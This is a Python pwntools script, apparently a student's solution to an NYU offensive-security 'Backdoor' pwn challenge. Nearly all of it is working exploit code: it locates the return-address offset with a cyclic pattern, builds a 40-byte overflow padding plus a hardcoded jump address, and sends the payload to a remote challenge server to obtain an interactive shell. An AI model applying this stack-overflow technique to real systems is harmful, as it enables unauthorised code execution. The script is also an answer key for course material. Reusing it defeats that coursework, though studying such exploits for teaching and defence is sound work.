from pwn import *
from pwnlib.util.packing import *
import re
import struct
import math

#############################################################
#	Backdoor_Pwn.py											#
#	Lindsay Von Tish (lmv9443@nyu.edu)						#
#	Pwn 2: Backdoor											#
#	03/06/2024												#
#############################################################

# A function to convert encoded input to a string and remove text format characters
#	Input: Encoded string
#	Output: Unencoded string
def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

# A function to find what part of the payload is being read as an address when the program crashes
#	Input: N/A
#	Output: N/A
def ripOffset():
	p = process('./backdoor')
	d = p.recvuntil("friend:")
	p.sendline(cyclic(100))
	# p.sendline(pld())
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	ripOffset = cyclic_find(pattern)
	info("rip offset = %d", ripOffset)

# A function to build a payload
#	Input: N/A
#	Output: N/A
def pld():
	pad = b'A'*40
	addr = p64(0x00004006bb)
	#a = pad + addr
	#print(a)
	return pad + addr

# A function to test payloads against backdoor in a debugger
#	Input: N/A
#	Output: N/A
def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./backdoor -q')
	p.sendline("r")
	p.recvuntil("friend:")
	p.sendline(pld())
	p.interactive()

# Host and port for the remote challenge
HOST = 'offsec-chalbroker.osiris.cyber.nyu.edu'
PORT = 1339

# A function to attack a remote instance of backdoor
#	Input: N/A
#	Output: N/A
def remoteShell():
	p = remote(HOST, PORT)
	p.recvuntil("friend:")
	p.sendline(pld())
	p.interactive()

# Uncomment to run
# ripOffset()
# testPld()
remoteShell()